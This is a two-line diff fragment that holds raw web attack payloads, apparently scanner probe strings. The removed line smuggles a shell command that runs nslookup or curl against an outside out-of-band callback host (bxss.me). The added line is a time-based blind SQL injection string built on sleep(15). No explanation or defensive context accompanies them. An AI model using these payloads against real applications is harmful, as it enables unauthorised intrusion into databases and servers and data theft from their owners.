@@ -1,1 +1,1 @@
-|(nslookup -q=cname hitmtptilvvgdf024a.bxss.me||curl hitmtptilvvgdf024a.bxss.me)
+5550"XOR(555*if(now()=sysdate(),sleep(15),0))XOR"Z
